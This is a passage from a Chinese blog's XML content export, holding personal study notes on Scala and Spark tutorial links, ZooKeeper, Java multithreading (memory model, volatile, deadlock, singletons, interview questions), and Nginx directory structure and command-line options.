<h2 id="scala"><a href="#scala" class="headerlink" title="scala"></a>scala</h2><p>Scala是一门现代的多范式编程语言，平滑地集成了面向对象和函数式语言的特性，旨在以简练、优雅的方式来表达常用编程模式。Scala的设计吸收借鉴了许多种编程语言的思想，只有很少量特点是Scala自己独有的。Scala语言的名称来自于“可伸展的语言”，从写个小脚本到建立个大系统的编程任务均可胜任。Scala运行于Java平台（JVM，Java 虚拟机）上，并兼容现有的Java程序，Scala代码可以调用Java方法，访问Java字段，继承Java类和实现Java接口。在面向对象方面，Scala是一门非常纯粹的面向对象编程语言，也就是说，在Scala中，<strong>每个值都是对象，每个操作都是方法调用</strong>。</p>
<p>Spark的设计目的之一就是使程序编写更快更容易，这也是Spark选择Scala的原因所在。</p>
<p><a href="http://dblab.xmu.edu.cn/blog/926-2/" target="_blank" rel="noopener">Scala简介</a></p>
<h3 id="经典教程-2"><a href="#经典教程-2" class="headerlink" title="经典教程"></a>经典教程</h3><p><a href="http://dblab.xmu.edu.cn/blog/spark/" target="_blank" rel="noopener">子雨大数据之Spark入门教程（Scala版）</a>  🐂🍺<br><a href="http://dblab.xmu.edu.cn/blog/929-2/" target="_blank" rel="noopener">Scala安装</a></p>
<h2 id="Spark"><a href="#Spark" class="headerlink" title="Spark"></a>Spark</h2><h3 id="经典教程-3"><a href="#经典教程-3" class="headerlink" title="经典教程"></a>经典教程</h3><p><a href="http://dblab.xmu.edu.cn/blog/python/" target="_blank" rel="noopener">厦门大学的Python入门教程</a><br><a href="http://dblab.xmu.edu.cn/blog/1709-2/" target="_blank" rel="noopener">子雨大数据之Spark入门教程(Python版)</a></p>
<h2 id="zookeeper"><a href="#zookeeper" class="headerlink" title="zookeeper"></a>zookeeper</h2><p>ZooKeeper是一个分布式的，开放源码的分布式应用程序协调服务，是Google的Chubby一个开源的实现，是Hadoop和Hbase的重要组件。它是一个为分布式应用提供一致性服务的软件，提供的功能包括：配置维护、域名服务、分布式同步、组服务等。<br>ZooKeeper的目标就是封装好复杂易出错的关键服务，将简单易用的接口和性能高效、功能稳定的系统提供给用户。<br>ZooKeeper包含一个简单的原语集， 提供Java和C的接口。<br>ZooKeeper代码版本中，提供了分布式独享锁、选举、队列的接口，代码在zookeeper-3.4.3\src\recipes。其中分布锁和队列有Java和C两个版本，选举只有Java版本。</p>
]]></content>
      <categories>
        <category>大数据</category>
      </categories>
      <tags>
        <tag>Hadoop</tag>
        <tag>hive</tag>
        <tag>spark</tag>
        <tag>hbase</tag>
        <tag>MapReduce</tag>
        <tag>sqoop</tag>
        <tag>scala</tag>
      </tags>
  </entry>
  <entry>
    <title>java-多线程</title>
    <url>/java-%E5%A4%9A%E7%BA%BF%E7%A8%8B/</url>
    <content><![CDATA[<h3 id="笔记"><a href="#笔记" class="headerlink" title="笔记"></a>笔记</h3><h4 id="Thread和Object类中的重要方法详解"><a href="#Thread和Object类中的重要方法详解" class="headerlink" title="Thread和Object类中的重要方法详解"></a>Thread和Object类中的重要方法详解</h4><p>sleep方法详解<br>作用：我只想让线程在预期的时间执行，其他时候不要占用CPU资源<br>不释放锁：<br>    包括synchronized和lock<br>    和wait不同</p>
<p>sleep方法响应中断<br>1.抛出InterruptedException<br>2.清除中断状态<br><a id="more"></a><br>sleep方法可以让线程进入Waiting状态，并且不占用CPU资源，但是不释放锁，直到规定时间后再执行，休眠期间如果被中断，会抛出异常并清除中断状态</p>
<p>join方法作用、用法<br>作用：因为新的线程加入了我们，所以我们要等他执行完再出发<br>用法：main等待thread1执行完毕，注意谁等谁</p>
<p>join原理<br>源码<br>分析<br>等价</p>
<p>yield方法详解<br>作用：释放我的CPU时间片<br>定位：JVM不保证遵循<br>yield和sleep区别：是否随时可能再次被调度</p>
<h4 id="线程的各个属性"><a href="#线程的各个属性" class="headerlink" title="线程的各个属性"></a>线程的各个属性</h4><p><img data-src="http://tuchuang.xchcloud.cn/blog/20201108/XT7LrsH4rR0n.png" alt="mark"></p>
<p>1、线程<br>作用：给用户线程提供服务</p>
<p>2、守护线程的3个特性：<br>线程类型默认继承自父线程<br>被谁启动<br>不影响JVM退出</p>
<p>3、守护线程和普通线程的区别：<br>整体无区别<br>唯一区别在于JVM的离开</p>
<p>4、线程优先级<br>  10个级别，默认5<br>程序设计不应依赖于优先级<br>◆不同操作系统不一样<br>windows 中有优先级推进器的功能。<br>◆优先级会被操作系统改变</p>
<h4 id="线程异常"><a href="#线程异常" class="headerlink" title="线程异常"></a>线程异常</h4><p>1、Java异常体系图</p>
<p>2、实际工作中，如何全局处理异常？为什么要全局处理？不处理行不行？</p>
<p>3、线程的未捕获异常UncaughtException应该如何处理？</p>
<p>4、为什么需要UncaughtExceptionHandler？</p>
<p>5、为什么需要UncaughtExceptionHandler？</p>
<p>6、主线程可以轻松发现异常，子线程却不行；子线程异常无法用传统方法捕获。</p>
<p>7、两种解决方案<br>方案一（不推荐）：手动在每个run方法里进行try catch<br>方案二（推荐）：利用UncaughtExceptionHandler<br>    UncaughtExceptionHandler接口<br>    void uncaughtException（Thread t，Throwable e）；<br>    异常处理器的调用策略</p>
<h4 id="线程安全"><a href="#线程安全" class="headerlink" title="线程安全"></a>线程安全</h4><p>1、什么情况下会出现线程安全问题，怎么避免？</p>
<p>运行结果错误：a++多线程下出现消失的请求现象<br><img data-src="http://tuchuang.xchcloud.cn/blog/20201108/Gn5sDsdrsQak.png" alt="mark"><br>活跃性问题：死锁、活锁、饥饿<br>对象发布和初始化的时候的安全问题</p>
<p>2、对象发布和初始化的时候的安全问题<br>什么是发布<br>什么是逸出<br>◆1.方法返回一个private对象（private的本意是不让外部访问）<br>◆2.还未完成初始化（构造函数没完全执行完毕）就把对象提供给外界，比如：<br>◆在构造函数中未初始化完毕就this赋值<br>◆隐式逸出——注册监听事件<br>◆构造函数中运行线程</p>
<p>3、各种需要考虑线程安全的情况<br>    访问共享的变量或资源，会有并发风险，比如对象的属性、静态变量、共享缓存、数据库等<br>    所有依赖时序的操作，即使每一步操作都是线程安全的，还是存在并发问题：read-modify-write、check-then-act<br>    不同的数据之间存在捆绑关系的时候<br>    我们使用其他类的时候，如果对方没有声明自己是线程安全的</p>
<p>4、多线程会导致的问题<br>    性能问题有哪些体现、什么是性能问题</p>
<p>调度：<br>上下文切换<br>    什么是上下文？<br>        保存现场<br>缓存开销<br>        缓存失效<br>何时会导致密集的上下文切换：<br>    抢锁、IO<br>协作：<br>    内存同步</p>
<pre><code>为什么多线程会带来性能问题
</code></pre><p>解决：<br>返回副本<br>工厂模式</p>
<p>什么是逸出？<br>    方法返回一个private对象（private的本意是不让外部访问）<br>    还未完成初始化（构造函数没完全执行完毕）就把对象提供给外界，比如：<br>        在构造函数中未初始化完毕就this赋值<br>        隐式逸出——注册监听事件<br>        构造函数中运行线程</p>
<p>各种需要考虑线程安全的情况<br>    访问共享的变量或资源，会有并发风险，比如对象的属性、静态变量、共享缓存、数据库等<br>    所有依赖时序的操作，即使每一步操作都是线程安全的，还是存在并发<br>    问题：read-modify-write、check-then-act<br>    不同的数据之间存在捆绑关系的时候<br>    我们使用其他类的时候，如果对方没有声明自己是线程安全的</p>
<h4 id="java-内存模型"><a href="#java-内存模型" class="headerlink" title="java 内存模型"></a>java 内存模型</h4><p>JVM实现会带来不同的“翻译”，不同的CPU平台的机器指令又干差万别，无法保证并发安全的效果一致</p>
<p>1、JVM 内存结构 VS Java 内存模型 VS Java 对象模型</p>
<p>整体方向：<br>JVM内存结构，Java虚拟机的运行时区域有关。<br>Java内存模型，和Java的并发编程有关。<br>Java对象模型，和Java对象在虚拟机中的表现形式有关。</p>
<p>2、Java对象模型<br>Java对象自身的存储模型<br>JVM会给这个类创建一个instanceKlass，保存在方法区，用来在JVM层表示该Java类。<br>当我们在Java代码中，使用new创建一个对象的时候，JVM会创建一个instanceOopDesc对象，这个对象中包含了对象头以及实例数据。</p>
<p>3、为什么需要JMM<br>C语言不存在内存模型的概念<br>依赖处理器，不同处理器结果不一样<br>无法保证并发安全<br>需要一个标准，让多线程运行的结果可预期</p>
<p>4、JMM是规范<br>Java Memory Model<br>是一组规范，需要各个JVM的实现来遵守JMM规范，以便于开发者可以利用这些规范，更方便地开发多线程程序。<br>如果没有这样的一个JMM内存模型来规范，那么很可能经过了不同JVM的不同规则的重排序之后，导致不同的虚拟机上运行的结果不一样，那是很大的问题。</p>
<p>5、JMM是工具类和关键字的原理<br>volatile、synchronized、Lock等的原理都是JMM<br>如果没有JMM，那就需要我们自己指定什么时候用内存栅栏等，那是相当麻烦的，幸好有了JMM，让我们只需要用同步工具和关键字就可以开发并发程序。</p>
<p>6、重排序</p>
<p>什么是重排序：<br>    在线程1内部的两行代码的实际执行顺序和代码在Java文件中的顺序不一致，代码指令并不是严格按照代码语句顺序执行的，它们的顺序被改变了，这就是重排序，这里被颠倒的是y=a和b=1这两行语句。</p>
<p>重排序的好处：提高处理速度</p>
<p>重排序的3种情况：编译器优化、CPU指令重排、内存的“重排序”<br>    编译器优化：包括JVM，IT编译器等<br>    CPU指令重排：就算编译器不发生重排，CPU也可能对指令进行重排<br>    内存的“重排序”：线程A的修改线程B却看不到，引出可见性问题 </p>
<p>对象发布和初始化的时候的安全问题<br>什么是发布？</p>
<p>7、可见性</p>
<p>为什么会有可见性问题？</p>
<p>寄存器 缓存<br>CPU有多级缓存，导致读的数据过期<br>·高速缓存的容量比主内存小，但是速度仅次于寄存器，所以在CPU和主内存之间就多了Cache层<br>·线程间的对于共享变量的可见性问题不是直接由多核引起的，而是由多缓存引起的。<br>·如果所有个核心都只用一个缓存，那么也就不存在内存可见性问题了。<br>·每个核心都会将自己需要的数据读到独占缓存中，数据修改后也是写入到缓存中，然后等待刷入到主存中。所以会导致有些核心读取的值是一个过期的值。</p>
<p>解释下什么是可见性问题？</p>
<p>8、JMM的抽象：主内存和本地内存</p>
<p>Java作为高级语言，屏蔽了这些底层细节，用JMM定义了一套读写内存数据的规范，虽然我们不再需要关心一级缓存和二级缓存的问题，但是，JMM抽象了主内存和本地内存的概念。</p>
<p>这里说的本地内存并不是真的是一块给每个线程分配的内存，而是JMM的一个抽象，是对于寄存器、一级缓存、二级缓存等的抽象。</p>
<p><img data-src="http://tuchuang.xchcloud.cn/blog/20201110/pe2oeLQGKuAd.png" alt="mark"><br><img data-src="http://tuchuang.xchcloud.cn/blog/20201110/lkLaKqYcnz0i.png" alt="mark"><br><img data-src="http://tuchuang.xchcloud.cn/blog/20201110/dlvmDVCCMJeL.png" alt="mark"></p>
<p>9、主内存和本地内存的关系</p>
<p>JMM有以下规定：<br>    所有的变量都存储在主内存中，同时每个线程也有自己独立的工作内存，工作内存中的变量内容是主内存中的拷贝<br>    线程不能直接读写主内存中的变量，而是只能操作自己工作内存中的变量然后再同步到主内存中<br>    主内存是多个线程共享的，但线程间不共享工作内存，如果线程间需要通信，必须借助主内存中转来完成<br>所有的共享变量存在于主内存中，每个线程有自己的本地内存，而且线程读写共享数据也是通过本地内存交换的，所以才导致了可见性问题。</p>
<p>10、Happens-Before原则<br>什么是 Happens-Before ？<br>    happens-before规则是用来解决可见性问题的：在时间上，动作A发生在动作B之前，B保证能看见A，这就是happens-before。<br>    两个操作可以用happens-before来确定它们的执行顺序：如果一个操作happens-before于另一个操作，那么我们说第一个操作对于第二个操作是可见的。</p>
<p>什么不是happens-before？<br>    两个线程没有相互配合的机制，所以代码X和Y的执行结果并不能保证总被对方看到的，这就不具备happens-before。</p>
<p>有哪些规则？<br>    1.单线程规则<br>    2.锁操作<br>    3.volatile变量<br>    4.线程启动<br>    5.线程join<br>    6.传递性<br>    7.中断<br>    8.构造方法（过时了）<br>    9.工具类<br>        1.线程安全的容器get一定能看到在此之前的put等存入动作<br>        2.CountDownLatch<br>        3.Semaphore<br>        4.Future<br>        5.线程池<br>        6.CyclicBarrier</p>
<p>总结：<br>不仅可以影响自己的可见性，还可以影响附近的变量的可见性。</p>
<p>11、volatile是什么？</p>
<pre><code>volatile是一种同步机制，比synchronized或者Lock相关类更轻量，因为使用volatile并不会发生上下文切换等开销很大的行为。
如果一个变量别修饰成volatile，那么JVM就知道了这个变量可能会被并发修改。
但是开销小，相应的能力也小，虽然说volatile是用来同步的保证线程安全的，但是volatile做不到synchronized那样的原子保护，volatile仅在很有限的场景下才能发挥作用。
</code></pre><p>12、volatile的适用场合</p>
<pre><code>不适用：a++
适用场合1：boolean flag，如果一个共享变量自始至终只被各个线程赋值，而没有其他的操作，那么就可以用volatile来代替synchronized或者代替原子变量，因为赋值自身是有原子性的，而volatile又保证了可见性，所以就足以保证线程安全。
</code></pre><p>13、原子性</p>
<p>什么是原子性?<br>    一系列的操作，要么全部执行成功，要么全部不执行，不会出现执行一半的情况，是不可分割的。</p>
<h3 id="课程问题"><a href="#课程问题" class="headerlink" title="课程问题"></a>课程问题</h3><p>1.实现多线程的方法到底有1种还是2种还是4种？<br>2.怎样才是正确的线程启动方式？<br>3.上山容易下山难——如何正确停止线程？（难点）<br>4.线程的一生——6个状态（生命周期）</p>
<p>1.为什么线程通信的方法wait），notify）和notifyAll0被定义在Object类里？而sleep定义在Thread类里？<br>2.用3种方式实现生产者模式<br>3.Java SE 8Java 1.8JDK8是什么关系，是同一个东西吗？<br>4.Join和sleep和wait期间线程的状态分别是什么？为什么？</p>
<p>5.yield方法<br>6.获取当前执行线程的引用：Thread.currentThread0方法<br>7.start和run方法<br>8.stop，suspend，resume方法<br>9.面试常见问题</p>
<p><img data-src="http://tuchuang.xchcloud.cn/blog/20201103/HQVYMOkAFg6Y.png" alt="mark"></p>
<h2 id="死锁问题与企业解决方案"><a href="#死锁问题与企业解决方案" class="headerlink" title="死锁问题与企业解决方案"></a>死锁问题与企业解决方案</h2><h3 id="死锁"><a href="#死锁" class="headerlink" title="死锁"></a>死锁</h3><p>1、什么是死锁？怎么发生的？<br>    发生在并发中<br>    互不相让：当两个（或更多）线程（或进程）相互持有对方所需要的资源，又不主动释放，导致所有人都无法继续前进，导致程序陷入无尽的阻塞，这就是死锁。<br>    <img data-src="http://tuchuang.xchcloud.cn/blog/20201112/C3VCCQv1sEuz.png" alt="mark"></p>
<p>2、死锁的影响是个啥？数据库与jvm种都有啥影响？</p>
<pre><code>数据库会自我检测，然后去放弃事务，问题来了：会丢失事务吗？
JVM中：无法自动处理。
</code></pre><p>3、死锁会有啥危害？高并发场景，多系统场景等等？<br>    虽然有些事情不会发生，但是随着使劲按推移，它一定会发生<br>    一旦发生，多是高并发场景，影响用户多<br>    整个系统崩溃、子系统崩溃、性能降低<br>    压力测试无法找出所有潜在的死锁</p>
<p>4、发生死锁的例子（退出的信号都素hi啥意思？）（发生死锁的条件）：<br>互斥、请求与保持条件、不剥夺条件、循环等待条件</p>
<p>5、如何定位死锁：<br>jstack，ThreadMXBeen 都是啥？怎么用？<br>检测算法：<br>    允许发生死锁<br>    每次调用锁都记录<br>    定期检查“锁的调用链路图”中是否存在环路<br>    一旦发生死锁，就用死锁恢复机制进行恢复</p>
<p>6、修复死锁的策略：</p>
<p>会根据系统情况来探究死锁的问题。</p>
<p>1.进程终止<br>    逐个终止线程，直到死锁消除。<br>    终止顺序：<br>    1.优先级（是前台交互还是后台处理）<br>    2.已占用资源、还需要的资源<br>    3.已经运行时间<br>2.资源抢占<br>    把已经分发出去的锁给收回来<br>    让线程回退几步，这样就不用结束整个线程，成本比较低<br>    缺点：可能同一个线程一直被抢占，那就造成饥饿</p>
<p>7、常见修复策略<br>避免策略：哲学家就餐的换手方案、转账换序方案<br>检测与恢复策略：一段时间检测是否有死锁，如果有就剥夺某一个资源，来打开死锁<br>蛇鸟策略：鸵鸟这种动物在遇到危险的时候，通常就会把头埋在地上，这样一来它就看不到危险了。而鸵鸟策略的意思就是说，如果我们发生死锁的概率极其低，那么我们就直接忽略它，直到死锁发生的时候，再人工修复。</p>
<p>8、哲学家就餐问题：</p>
<p>9、如何避免死锁<br>1.设置超时时间<br>    Lock的tryLock（long timeout，TimeUnit unit）<br>    synchronized不具备尝试锁的能力<br>    造成超时的可能性多：发生了死锁、线程陷入死循环、线程执行很慢<br>    获取锁失败：打日志、发报警邮件、重启等<br>2.多使用并发类而不是自己设计锁<br>    ConcurrentHashMap、ConcurrentLinkedQueue、AtomicBoolean等<br>    实际应用中java.util.concurrent.atomic十分有用，简单方便且效率比使用Lock更高<br>    多用并发集合少用同步集合，并发集合比同步集合的可扩展性更好<br>    并发场景需要用到map，首先想到用ConcurrentHashMap<br>3.尽量降低锁的使用粒度：用不同的锁而不是一个锁</p>
<p>4.如果能使用同步代码块，就不使用同步方法：自己指定锁对象</p>
<p>5.给你的线程起个有意义的名字：debug和排查时事半功倍，框架和JDK都遵守这个最佳实践</p>
<p>6.避免锁的嵌套：MustDeadLock类</p>
<p>7.分配资源前先看能不能收回来：银行家算法</p>
<p>8.尽量不要几个功能用同一把锁：专锁专用</p>
<p>10、其他活性故障<br>    死锁是最常见的活跃性问题，不过除了刚才的死锁之外，还有一些类似的问题，会导致程序无法顺利执行，统称为活跃性问题<br>    活锁（LiveLock）<br>        死锁：每个哲学家都拿着左手的餐叉，永远都在等右边的餐叉（或者相反）<br>        活锁：在完全相同的时刻进入餐厅，并同时拿起左边的餐叉，那么这些哲学家就会等待五分钟，同时放下手中的餐叉，再等五分钟，又同时拿起这些餐叉<br>        虽然线程并没有阻塞，也始终在运行（所以叫做“活”锁，线程是“活”的），但是程序却得不到进展，因为线程始终重复做同样的事<br>        如果这里死锁，那么就是这里两个人都始终一动不动，直到对方先抬头，他们之间不再说话了，只是等待<br>        如果发生活锁，那么这里的情况就是，双方都不停地对对方说“你先起来吧，你先起来吧”，双方都一直在说话，在运行<br>        死锁和活锁的结果是一样的，就是谁都不能先抬头<br>    饥饿<br>        当线程需要某些资源（例如CPU），但是却始终得不到<br>        线程的优先级设置得过于低，或者有某线程持有锁同时又无限循环从而不释放锁，或者某程序始终占用某文件的写锁<br>        饥饿可能会导致响应性差：比如，我们的浏览器有一个线程负责处理前台响应（打开收藏夹等动作），另外的后台线程负责下载图片和文件、计算渲染等。在这种情况下，如果后台线程把CPU资源都占用了，那么前台线程将无法得到很好地执行，这会导致用户的体验很差</p>
<p>11、如何解决活锁问题<br>    原因：重试机制不变，消息队列始终重试，吃饭始终谦<br>    以太网的指数退避算法<br>    加入随机因素<br>工程中的活锁实例：消息队列<br>    策略：消息如果处理失败，就放在队列开头重试<br>    由于依赖服务出了问题，处理该消息一直失败Message in<br>    没阻塞，但程序无法继续<br>    解决：放到队列尾部、重试限制IFO queue Message out</p>
<h2 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h2><p>1、Runnable 接口是个啥？</p>
<p>2、线程锁是什么状态下有的？</p>
<p>3、synchronized 什么方法去修饰</p>
<p>4、LinkedList 以及其 poll 方法</p>
<p>5、手写一个生产者消费者问题</p>
<p>6、用两个线程交替打印出 0~100 的奇偶数</p>
<p>7、为什么wait0需要在同步代码块内使用，而 sleep 不需要</p>
<p>8、为什么线程通信的方法wait0，notify）和notifyAll0被定义在Object类里？而sleep定义在Thread类里？</p>
<p>9、wait方法是属于Object对象的，那调用Thread.wait会怎么样？</p>
<p>建议看看源码</p>
<p>10、如何选择用notify还是nofityAll？</p>
<p>唤醒一个或者多个线程</p>
<p>11、notifyAll之后所有的线程都会再次抢夺锁，如果某线程抢夺失败怎么办？</p>
<p>进入等待状态</p>
<p>12、用suspend0和resume0来阻塞线程可以吗？为什么？<br>安全问题弃用</p>
<p>13、avaSE，JavaEE，JavaME是什么？<br>标准版<br>企业版<br>移动版</p>
<p>14、JRE和JDK和JVM是什么关系？</p>
<p>jre环境：跑的环境，包JVM还包含一些库<br>jdk：开发工具包，包含jre，还包含其他诊断工具等。<br>jvm: 虚拟机</p>
<p>15、独占锁？ReentrantLock();</p>
<p>16、wait/notify、sleep异同（方法属于哪个对象？线程状态怎么切换？）<br>相同<br>◆阻塞<br>◆响应中断<br>不同<br>◆同步方法中<br>◆释放锁指定时间◆所属类</p>
<p>17、Frames 与 Thread 面板</p>
<p>18、应用场景有哪些？</p>
<p>19、获取当前执行线程的引用：Thread.currentThread方法<br>start和run方法<br>stop，suspend，resume方法</p>
<p>20、什么时候我们需要设置守护线程？</p>
<p>21、我们应该如何应用线程优先级来帮助程序运行？有哪些禁忌？</p>
<p>22、不同的操作系统如何处理优先级问题？</p>
<p>23、线程的id为什么不会重复？线程的名字什么时候可以修改？</p>
<p>24、守护线程和普通线程的区别</p>
<p>25、我们是否需要给线程设置为守护线程？</p>
<p>容易造成资源不一致</p>
<p>26、如何全局处理异常？为什么要全局处理？不处理行不行？</p>
<p>27、run方法是否可以抛出异常？如果抛出异常，线程的状态会怎么样？</p>
<p>28、线程中如何处理某个未处理异常？</p>
<p>29、一共有哪几类线程安全问题？</p>
<p>30、哪些场景需要额外注意线程安全问题？</p>
<p>31、什么是多线程的上下文切换？</p>
<p>32、AtomicInteger 是个啥？</p>
<p>33、CyclicBarrier 怎么用？</p>
<p>34、CountDownLatch ？</p>
<p>35、插件过滤，idea那个神器？</p>
<p>36、volatile 什么作用？volatile和synchronized的关系？怎么用volatile修正重排序问题？</p>
<p>37、单例模式的作用，为什么需要单例？<br>节省内存和计算保证结果正确方便管理</p>
<p>38、单例模式适用场景<br>    1.无状态的工具类：比如日志工具类，不管是在哪里使用，我们需要的只是它帮我们记录日志信息，除此之外，并不需要在它的实例对象上存储任何状态，这时候我们就只需要一个实例对象即可。<br>    2.全局信息类：比如我们在一个类上记录网站的访问次数，我们不希望有的访问被记录在对象A上，有的却记录在对象B上，这时候我们就让这个类成为单例。</p>
<p>39、单例模式的8种写法：<br>    1.饿汉式（静态常量式）<br>    2.饿汉式（静态代码块）<br>    3.懒汉式（线程不安全）<br>    4.懒汉式（线程安全，同步方法）<br>    5.懒汉式（线程不安全）<br>    6.双重检查  推荐面试使用<br>    <img data-src="http://tuchuang.xchcloud.cn/blog/20201110/TFdK9pFus34D.png" alt="mark"><br>    7.静态内部类的方式   推荐<br>    8.枚举  最好<br>各种写法的适用场合？<br>    最好的方法是利用枚举，因为还可以防止反序列化重新创建新的对象；<br>    非线程同步的方法不能使用；<br>    如果程序一开始要加载的资源太多，那么就应该使用懒加载；<br>    饿汉式如果是对象的创建需要配置文件就不适用。<br>    懒加载虽然好，但是静态内部类这种方式会引入编程复杂性</p>
<p>饿汉式的缺点？<br>懒汉式的缺点？<br>为什么要用double-check？不用就不安全吗？<br>为什么双重检查模式要用volatile？</p>
<p>40、用哪种单例的实现方案最好？</p>
<pre><code>Joshua Bloch大神在《Effective Java》中明确表达过的观点：“使用枚举实现单例的方法虽然还没有广泛采用，但是单元素的枚举类型已经成为实现Singleton的最佳方法。&quot;
写法简单
线程安全有保障
避免反序列化破坏单例
</code></pre><p>41、讲一讲什么是Java内存模型</p>
<p>42、什么是原子操作？Java中有哪些原子操作？生成对象的过程是不是原子操作？<br>    1.新建一个空的Person对象<br>    2.把这个对象的地址指向p<br>    3.执行Person的构造函数</p>
<p>43、什么是内存可见性？</p>
<p>44、64位的double和long写入的时候是原子的吗？</p>
<p>45、Thread.sleep(0) 到底有什么用？<br>答：这个东西要聊一聊linux与windows怎么分配线程的。一个是轮流，一个是届算法。<br>然后呢，饥饿算法可能会有问题，导致某一个线程一直占用着cpu。这时候调用 sleep(0) 的线程会告诉CPU，你从新算下任务调度。sleep 里面的参数代表着多少秒内该线程不需要执行。</p>
<p>46、什么是线程池，怎么创建线程销毁线程的？多余的空闲线程是怎么回收的呢？会不会有oom的情况出现？为什么？怎么解决？解决方式是个啥？</p>
<p>47、</p>
]]></content>
      <categories>
        <category>多线程</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>多线程</tag>
      </tags>
  </entry>
  <entry>
    <title>Nginx-进阶笔记</title>
    <url>/Nginx-%E8%BF%9B%E9%98%B6%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h2 id="目录结构"><a href="#目录结构" class="headerlink" title="目录结构"></a>目录结构</h2><h3 id="源码结构"><a href="#源码结构" class="headerlink" title="源码结构"></a>源码结构</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[root@localhost nginx-1.2.0]# ls -F</span><br><span class="line">auto/  CHANGES  CHANGES.ru  conf/  configure*  contrib/  html/  LICENSE  man/  README  src/</span><br><span class="line">&lt;!-- more --&gt;</span><br><span class="line">auto/：包含了很多会在执行configure进行编译配置时调用的检测代码。</span><br><span class="line">CHANGES：Nginx的版本更新细节记录。英文版。</span><br><span class="line">CHANGES.ru：Nginx的版本更新细节记录。俄文版。</span><br><span class="line">conf/：Nginx提供的一些默认配置文件。</span><br><span class="line">configure*：根据系统环境设定Nginx编译选项的执行脚本。</span><br><span class="line">contrib/：网友贡献的一些有用脚本。</span><br><span class="line">    ps:  cp -r contrib/vim/* ~/.vim/     可以使vim支持nginx配置语言的语法。</span><br><span class="line">html/：提供了两个默认html页面，比如index.html的Welcome to nginx!。</span><br><span class="line">LICENSE：声明的Nginx源码许可协议。</span><br><span class="line">man/：Nginx的Man手册，本文文件，可直接用vi或记事本打开。</span><br><span class="line">README：读我文件，内容很简单，通告一下官网地址。</span><br><span class="line">src/：Nginx源码，分门别类，比如实现事件的event等，很清晰。</span><br><span class="line">执行configure脚本后将生成Makefile文件和objs目录，这是根据当前系统环境生成的相关编译配置。Nginx并没有使用Autoconf1和Automake2等这样的自动化工具来做这个工作，而都是手动编码实现的。比如当Nginx判断当前Linux系统是否支持epoll时，它采用的方法就是编写一款小应用程序，并在其中调用epoll_create()函数，然后再根据它是否可被正常编译执行来做这个判断。具体可参考文件nginx-1.2.0/auto/os/linux和nginx-1.2.0/auto/feature内相关代码。  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">编译参数问题：</span><br><span class="line"></span><br><span class="line">./configure --help | more   查看有哪些参数</span><br><span class="line">参数类型：</span><br><span class="line">第一类：目录</span><br><span class="line">第二类：使用哪些模块(with 默认编译不带该模块)、不使用哪些模块(without 默认编译带该模块)</span><br><span class="line">第三类：优化参数、debug日志、第三方模块</span><br><span class="line"></span><br><span class="line">中间文件 ：objs 目录</span><br><span class="line">ngx_modules.c : 被编译进的模块会在一个文件中，并且存为一个数组。</span><br></pre></td></tr></table></figure>
<h3 id="应用结构"><a href="#应用结构" class="headerlink" title="应用结构"></a>应用结构</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[root@www ~]# tree /application/nginx/</span><br><span class="line">/application/nginx/</span><br><span class="line">|-- client_body_temp</span><br><span class="line">|-- conf                    　　　　　　　　　　　　　　#这是Nginx所有配置文件的目录，极其重要</span><br><span class="line">|   |-- fastcgi.conf         　　　　　　 　　　       #fastcgi相关参数的配置文件</span><br><span class="line">|   |-- fastcgi.conf.default     　　  　　　　　　　　#fastcgi.conf的原始备份</span><br><span class="line">|   |-- fastcgi_params          　　　　　　　　　     #fastcgi的参数文件</span><br><span class="line">|   |-- fastcgi_params.default</span><br><span class="line">|   |-- koi-utf</span><br><span class="line">|   |-- koi-win</span><br><span class="line">|   |-- mime.types          　　　　　　　　　　　　    #媒体类型，</span><br><span class="line">|   |-- mime.types.default</span><br><span class="line">|   |-- nginx.conf         　　　　　　　　　　　　     #这是Nginx默认的主配置文件</span><br><span class="line">|   |-- nginx.conf.default</span><br><span class="line">|   |-- scgi_params         　　　　　　　　　　　      #scgi相关参数文件，一般用不到</span><br><span class="line">|   |-- scgi_params.default</span><br><span class="line">|   |-- uwsgi_params               　　　　　　        #uwsgi相关参数文件，一般用不到</span><br><span class="line">|   |-- uwsgi_params.default</span><br><span class="line">|   `-- win-utf</span><br><span class="line">|-- fastcgi_temp               　　　　　　　　        #fastcgi临时数据目录</span><br><span class="line">|-- html     　　　　　　　　　　　　　　　　　　        #这是编译安装时Nginx的默认站点目录，类似</span><br><span class="line">                    Apache的默认站点htdocs目录</span><br><span class="line">|   |--50x.html                                       #错误页面优雅替代显示文件，例如：出现502错误时会调用此页面</span><br><span class="line">                                                      #error_page   500502503504  /50x.html；</span><br><span class="line">|   `-- index.html                                    #默认的首页文件，首页文件名字是在nginx.conf中事先定义好的。</span><br><span class="line">|-- logs                                              #这是Nginx默认的日志路径，包括错误日志及访问日志</span><br><span class="line">|   |-- access.log                                    #这是Nginx的默认访问日志文件，使用tail -f access.log，可以实时观看网站用户访问情况信息</span><br><span class="line">|   |-- error.log                                     #这是Nginx的错误日志文件，如果Nginx出现启动故障等问题，一定要看看这个错误日志</span><br><span class="line">|   `-- nginx.pid                                     #Nginx的pid文件，Nginx进程启动后，会把所有进程的ID号写到此文件</span><br><span class="line">|-- proxy_temp                                        #临时目录</span><br><span class="line">|-- sbin                                              #这是Nginx命令的目录，如Nginx的启动命令nginx</span><br><span class="line">|   `-- nginx                                         #Nginx的启动命令nginx</span><br><span class="line">|-- scgi_temp                                         #临时目录</span><br><span class="line">`-- uwsgi_temp                                        #临时目录</span><br><span class="line">9 directories，21 files</span><br></pre></td></tr></table></figure>
<h2 id="命令行"><a href="#命令行" class="headerlink" title="命令行"></a>命令行</h2><p>nginx -s reload<br>帮助：-? -h<br>使用指定的配置文件：-c<br>指定配置指令：-g<br>指定运行目录: -p<br>发送信号：-s</p>
<ul>
<li>立即停止：stop</li>
<li>优雅的停止：quit</li>
<li>重载配置：reload</li>
<li>重新开始记录日志文件: reopen</li>
</ul>
<p>测试配置文件是否有语法错误：-t -T<br>打印nginx的版本信息、编译信息等：-v -V</p>
